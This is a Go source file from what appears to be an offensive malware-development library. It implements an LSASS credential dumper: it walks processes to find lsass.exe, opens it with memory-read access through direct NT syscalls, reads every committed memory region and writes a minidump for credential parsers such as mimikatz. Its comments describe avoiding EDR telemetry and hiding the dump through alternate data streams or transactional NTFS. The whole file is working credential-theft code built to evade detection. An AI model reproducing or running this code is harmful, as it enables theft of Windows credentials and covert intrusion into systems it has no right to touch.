//go:build windows

package lsassdump

import (
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/evasion/stealthopen"
	"github.com/oioio-space/maldev/process/enum"
	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
	"github.com/oioio-space/maldev/win/version"
)

// STATUS codes we handle explicitly.
const (
	statusSuccess       = 0
	statusNoMoreEntries = 0x8000001A
	statusAccessDenied  = 0xC0000022
)

// Access masks. Walking the process list only needs QUERY_LIMITED so
// the walk works even against protected processes (smss, csrss). VM_READ
// is only requested against lsass itself via a targeted NtOpenProcess,
// keeping the audit surface minimal.
const (
	walkAccess  = windows.PROCESS_QUERY_LIMITED_INFORMATION
	lsassAccess = windows.PROCESS_QUERY_LIMITED_INFORMATION | windows.PROCESS_VM_READ
)

// OpenLSASS walks the running-process list via NtGetNextProcess using
// PROCESS_QUERY_LIMITED_INFORMATION (cheap access that even protected
// processes grant), identifies lsass.exe by ProcessImageFileName, reads
// its PID, then reopens it via NtOpenProcess with QUERY_LIMITED |
// VM_READ. Splitting the walk from the target open keeps the audit
// surface to a single VM_READ request against lsass itself.
//
// Callers MUST pair every successful OpenLSASS with a CloseLSASS to
// avoid leaking a process handle.
func OpenLSASS(caller *wsyscall.Caller) (uintptr, error) {
	var cur windows.Handle
	var pid uint32
	for {
		next, err := ntGetNextProcess(cur, walkAccess, caller)
		if cur != 0 {
			windows.CloseHandle(cur) //nolint:errcheck
		}
		if err != nil {
			if errors.Is(err, errNoMoreEntries) {
				return 0, ErrLSASSNotFound
			}
			return 0, err
		}
		name, err := ntProcessImageBaseName(next, caller)
		if err == nil && strings.EqualFold(name, "lsass.exe") {
			pid, err = ntProcessPID(next, caller)
			windows.CloseHandle(next) //nolint:errcheck
			if err != nil {
				return 0, fmt.Errorf("read lsass PID: %w", err)
			}
			break
		}
		cur = next
	}

	h, err := ntOpenProcessByPID(pid, lsassAccess, caller)
	if err != nil {
		return 0, err
	}
	return uintptr(h), nil
}

// CloseLSASS closes the handle returned by OpenLSASS.
func CloseLSASS(h uintptr) error {
	return windows.CloseHandle(windows.Handle(h))
}

// LsassPID walks the running-process list (same path OpenLSASS uses)
// and returns lsass.exe's PID without leaving an open handle behind.
// Useful for callers that need to reopen lsass with non-default
// access (e.g. credentials/sekurlsa.Pass needs PROCESS_VM_WRITE).
//
// Caller (optional) routes the NtGetNextProcess / NtQuery* through
// the wsyscall strategy of the caller's choice.
func LsassPID(caller *wsyscall.Caller) (uint32, error) {
	var cur windows.Handle
	for {
		next, err := ntGetNextProcess(cur, walkAccess, caller)
		if cur != 0 {
			windows.CloseHandle(cur) //nolint:errcheck
		}
		if err != nil {
			if errors.Is(err, errNoMoreEntries) {
				return 0, ErrLSASSNotFound
			}
			return 0, err
		}
		name, err := ntProcessImageBaseName(next, caller)
		if err == nil && strings.EqualFold(name, "lsass.exe") {
			pid, err := ntProcessPID(next, caller)
			windows.CloseHandle(next) //nolint:errcheck
			if err != nil {
				return 0, fmt.Errorf("read lsass PID: %w", err)
			}
			return pid, nil
		}
		cur = next
	}
}

// Dump reads lsass.exe's memory via NtReadVirtualMemory and writes a
// MINIDUMP blob (MDMP) to w. The returned Stats summarises what landed.
// Caller (optional) routes the memory reads through the wsyscall
// strategy of the caller's choice.
func Dump(h uintptr, w io.Writer, caller *wsyscall.Caller) (Stats, error) {
	if h == 0 {
		return Stats{}, errors.New("lsassdump: nil handle")
	}
	ph := windows.Handle(h)

	regions, err := collectRegions(ph, caller)
	if err != nil {
		return Stats{}, fmt.Errorf("enum regions: %w", err)
	}
	mods, err := collectModules(ph, caller)
	if err != nil {
		return Stats{}, fmt.Errorf("enum modules: %w", err)
	}
	si := collectSystemInfo()

	cfg := Config{
		TimeDateStamp: uint32(time.Now().Unix()),
		SystemInfo:    si,
		Modules:       mods,
		Regions:       regions,
	}
	return Build(w, cfg)
}

// DumpToFile opens lsass, dumps to path with 0o600, closes the handle on
// any outcome, and syncs to disk before returning. Equivalent to
// [DumpToFileVia] with a nil Creator.
func DumpToFile(path string, caller *wsyscall.Caller) (Stats, error) {
	return DumpToFileVia(nil, path, caller)
}

// DumpToFileVia opens lsass and writes the minidump through the
// operator-supplied [stealthopen.Creator]. nil falls back to a
// [stealthopen.StandardCreator] (plain os.OpenFile) — same byte
// content as [DumpToFile]. Use a non-nil Creator to land the dump
// through transactional NTFS, an encrypted-stream wrapper, ADS, or
// any other operator-controlled write primitive — symmetric to the
// read-side [stealthopen.Opener] threaded through the eprocess
// discovery helpers.
//
// On any error the path is removed (best-effort) so partial dumps
// don't leak on disk.
func DumpToFileVia(creator stealthopen.Creator, path string, caller *wsyscall.Caller) (Stats, error) {
	h, err := OpenLSASS(caller)
	if err != nil {
		return Stats{}, err
	}
	defer CloseLSASS(h) //nolint:errcheck

	wc, err := stealthopen.UseCreator(creator).Create(path)
	if err != nil {
		return Stats{}, fmt.Errorf("open %q: %w", path, err)
	}
	stats, dumpErr := Dump(h, wc, caller)
	// Best-effort sync — only StandardCreator returns *os.File. Custom
	// Creators routing through transactional NTFS / ADS / encrypted
	// streams may have their own commit semantics on Close.
	if f, ok := wc.(*os.File); ok {
		if syncErr := f.Sync(); syncErr != nil && dumpErr == nil {
			dumpErr = syncErr
		}
	}
	if closeErr := wc.Close(); closeErr != nil && dumpErr == nil {
		dumpErr = closeErr
	}
	if dumpErr != nil {
		os.Remove(path) //nolint:errcheck
	}
	return stats, dumpErr
}

// ---- Nt* wrappers --------------------------------------------------

var (
	errNoMoreEntries = errors.New("lsassdump: NtGetNextProcess: no more entries")
	errAccessDenied  = errors.New("lsassdump: access denied")
)

// ntGetNextProcess wraps the NTDLL export. Returns STATUS_NO_MORE_ENTRIES
// as errNoMoreEntries so the walker can terminate cleanly.
func ntGetNextProcess(cur windows.Handle, access uint32, caller *wsyscall.Caller) (windows.Handle, error) {
	var next windows.Handle
	if caller != nil {
		r, _ := caller.Call("NtGetNextProcess",
			uintptr(cur),
			uintptr(access),
			0, // HandleAttributes
			0, // Flags
			uintptr(unsafe.Pointer(&next)),
		)
		return classifyStatus(next, uint32(r))
	}
	// WinAPI fallback — NtGetNextProcess isn't in x/sys/windows, so we
	// bind it lazily via ntdll.
	r, _, _ := api.ProcNtGetNextProcess.Call(
		uintptr(cur),
		uintptr(access),
		0, 0,
		uintptr(unsafe.Pointer(&next)),
	)
	return classifyStatus(next, uint32(r))
}

func classifyStatus(h windows.Handle, status uint32) (windows.Handle, error) {
	switch status {
	case statusSuccess:
		return h, nil
	case statusNoMoreEntries:
		return 0, errNoMoreEntries
	case statusAccessDenied:
		return h, errAccessDenied
	default:
		return 0, fmt.Errorf("lsassdump: NtGetNextProcess: NTSTATUS 0x%X", status)
	}
}

// ntProcessImageBaseName queries ProcessImageFileName (= 27) and returns
// the basename ("lsass.exe" not "\Device\HarddiskVolume3\…").
func ntProcessImageBaseName(h windows.Handle, caller *wsyscall.Caller) (string, error) {
	const processImageFileName = 27
	buf := make([]byte, 4096)
	var retLen uint32
	var r uintptr
	if caller != nil {
		rr, _ := caller.Call("NtQueryInformationProcess",
			uintptr(h),
			processImageFileName,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
			uintptr(unsafe.Pointer(&retLen)),
		)
		r = rr
	} else {
		rr, _, _ := api.ProcNtQueryInformationProcess.Call(
			uintptr(h),
			processImageFileName,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
			uintptr(unsafe.Pointer(&retLen)),
		)
		r = rr
	}
	if r != 0 {
		return "", fmt.Errorf("NtQueryInformationProcess(ImageFileName): NTSTATUS 0x%X", uint32(r))
	}
	us := (*windows.NTUnicodeString)(unsafe.Pointer(&buf[0]))
	if us.Length == 0 || us.Buffer == nil {
		return "", errors.New("empty image name")
	}
	full := windows.UTF16PtrToString(us.Buffer)
	return filepath.Base(full), nil
}

// ntProcessPID reads ProcessBasicInformation and returns UniqueProcessId.
func ntProcessPID(h windows.Handle, caller *wsyscall.Caller) (uint32, error) {
	const processBasicInformation = 0
	var pbi struct {
		ExitStatus              int32
		_                       uint32 // alignment on x64 for following pointer
		PebBaseAddress          uintptr
		AffinityMask            uintptr
		BasePriority            int32
		_                       uint32
		UniqueProcessID         uintptr
		InheritedFromUniqueProc uintptr
	}
	var retLen uint32
	var r uintptr
	if caller != nil {
		rr, _ := caller.Call("NtQueryInformationProcess",
			uintptr(h),
			processBasicInformation,
			uintptr(unsafe.Pointer(&pbi)),
			unsafe.Sizeof(pbi),
			uintptr(unsafe.Pointer(&retLen)),
		)
		r = rr
	} else {
		rr, _, _ := api.ProcNtQueryInformationProcess.Call(
			uintptr(h),
			processBasicInformation,
			uintptr(unsafe.Pointer(&pbi)),
			unsafe.Sizeof(pbi),
			uintptr(unsafe.Pointer(&retLen)),
		)
		r = rr
	}
	if r != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess(Basic): NTSTATUS 0x%X", uint32(r))
	}
	return uint32(pbi.UniqueProcessID), nil
}

// ntOpenProcessByPID opens a process handle by PID. Both WinAPI
// fallback and Caller paths route through NtOpenProcess (no
// kernel32!OpenProcess) because the latter triggers path-based
// telemetry on some EDRs via the image-load tracer.
func ntOpenProcessByPID(pid uint32, access uint32, caller *wsyscall.Caller) (windows.Handle, error) {
	type clientID struct {
		UniqueProcess uintptr
		UniqueThread  uintptr
	}
	type objectAttributes struct {
		Length                   uint32
		_                        uint32
		RootDirectory            uintptr
		ObjectName               uintptr
		Attributes               uint32
		_                        uint32
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}
	var h windows.Handle
	cid := clientID{UniqueProcess: uintptr(pid)}
	oa := objectAttributes{Length: uint32(unsafe.Sizeof(objectAttributes{}))}

	var r uintptr
	if caller != nil {
		rr, _ := caller.Call("NtOpenProcess",
			uintptr(unsafe.Pointer(&h)),
			uintptr(access),
			uintptr(unsafe.Pointer(&oa)),
			uintptr(unsafe.Pointer(&cid)),
		)
		r = rr
	} else {
		rr, _, _ := api.ProcNtOpenProcess.Call(
			uintptr(unsafe.Pointer(&h)),
			uintptr(access),
			uintptr(unsafe.Pointer(&oa)),
			uintptr(unsafe.Pointer(&cid)),
		)
		r = rr
	}
	switch uint32(r) {
	case statusSuccess:
		return h, nil
	case statusAccessDenied:
		return 0, ErrOpenDenied
	case 0xC0000071: // STATUS_PROCESS_IS_PROTECTED — PPL path
		return 0, ErrPPL
	default:
		return 0, fmt.Errorf("NtOpenProcess(pid=%d): NTSTATUS 0x%X", pid, uint32(r))
	}
}

// collectRegions walks VirtualQuery from base 0 upward, returning every
// committed, non-guard, non-image-as-noaccess region along with its
// content read via NtReadVirtualMemory.
func collectRegions(h windows.Handle, caller *wsyscall.Caller) ([]MemoryRegion, error) {
	const (
		memCommit = 0x00001000
	)
	var regions []MemoryRegion
	var addr uintptr
	for {
		var mbi windows.MemoryBasicInformation
		if err := ntQueryVirtualMemory(h, addr, &mbi, caller); err != nil {
			// End of user-mode address space.
			break
		}
		next := mbi.BaseAddress + mbi.RegionSize
		if next <= addr {
			break // overflow guard
		}
		if mbi.State == memCommit && mbi.Protect != 0 && mbi.Protect&0x100 == 0 {
			// Skip PAGE_GUARD (0x100). Read the whole region in one shot.
			data := make([]byte, mbi.RegionSize)
			read, err := ntReadVirtualMemory(h, mbi.BaseAddress, data, caller)
			if err == nil && read > 0 {
				regions = append(regions, MemoryRegion{
					BaseAddress: uint64(mbi.BaseAddress),
					Data:        data[:read],
				})
			}
		}
		addr = next
	}
	return regions, nil
}

func ntQueryVirtualMemory(h windows.Handle, addr uintptr, mbi *windows.MemoryBasicInformation, caller *wsyscall.Caller) error {
	const memoryBasicInformation = 0
	var retLen uintptr
	var r uintptr
	if caller != nil {
		rr, _ := caller.Call("NtQueryVirtualMemory",
			uintptr(h),
			addr,
			memoryBasicInformation,
			uintptr(unsafe.Pointer(mbi)),
			unsafe.Sizeof(*mbi),
			uintptr(unsafe.Pointer(&retLen)),
		)
		r = rr
	} else {
		rr, _, _ := api.ProcNtQueryVirtualMemory.Call(
			uintptr(h),
			addr,
			memoryBasicInformation,
			uintptr(unsafe.Pointer(mbi)),
			unsafe.Sizeof(*mbi),
			uintptr(unsafe.Pointer(&retLen)),
		)
		r = rr
	}
	if r != 0 {
		return fmt.Errorf("NtQueryVirtualMemory: NTSTATUS 0x%X", uint32(r))
	}
	return nil
}

func ntReadVirtualMemory(h windows.Handle, addr uintptr, buf []byte, caller *wsyscall.Caller) (uintptr, error) {
	if len(buf) == 0 {
		return 0, nil
	}
	var read uintptr
	var r uintptr
	if caller != nil {
		rr, _ := caller.Call("NtReadVirtualMemory",
			uintptr(h),
			addr,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
			uintptr(unsafe.Pointer(&read)),
		)
		r = rr
	} else {
		rr, _, _ := api.ProcNtReadVirtualMemory.Call(
			uintptr(h),
			addr,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
			uintptr(unsafe.Pointer(&read)),
		)
		r = rr
	}
	if r != 0 {
		return 0, fmt.Errorf("NtReadVirtualMemory: NTSTATUS 0x%X", uint32(r))
	}
	return read, nil
}

// collectModules delegates to process/enum.Modules(pid), which walks
// the Toolhelp32 snapshot for the given PID. The PID is extracted
// from h via ntProcessPID (one extra Nt syscall; cheap compared to
// the many NtReadVirtualMemory calls that follow).
func collectModules(h windows.Handle, caller *wsyscall.Caller) ([]Module, error) {
	pid, err := ntProcessPID(h, caller)
	if err != nil {
		return nil, fmt.Errorf("get PID: %w", err)
	}
	snap, err := enum.Modules(pid)
	if err != nil {
		return nil, fmt.Errorf("enum.Modules(%d): %w", pid, err)
	}
	out := make([]Module, 0, len(snap))
	for _, m := range snap {
		// Prefer full path so credential parsers (pypykatz, mimikatz)
		// can disambiguate modules with the same basename.
		name := m.Path
		if name == "" {
			name = m.Name
		}
		out = append(out, Module{
			BaseOfImage: uint64(m.Base),
			SizeOfImage: m.Size,
			Name:        name,
		})
	}
	return out, nil
}

// collectSystemInfo fills a SystemInfo from RtlGetVersion (bypasses the
// manifest-clamped GetVersionEx) so credential parsers pick the right
// per-build offset table.
func collectSystemInfo() SystemInfo {
	v := version.Current()
	var arch uint16 = 9 // PROCESSOR_ARCHITECTURE_AMD64
	si := SystemInfo{
		ProcessorArchitecture: arch,
		MajorVersion:          v.MajorVersion,
		MinorVersion:          v.MinorVersion,
		BuildNumber:           v.BuildNumber,
		PlatformID:            2, // VER_PLATFORM_WIN32_NT
		ProductType:           uint8(v.ProductType),
		NumberOfProcessors:    1,
	}
	return si
}

// Proc bindings live in win/api (single source of truth per CLAUDE.md):
//   api.ProcNtGetNextProcess, ProcNtOpenProcess,
//   ProcNtQueryInformationProcess, ProcNtReadVirtualMemory,
//   ProcNtQueryVirtualMemory. Module enumeration delegates to
//   process/enum.Modules.

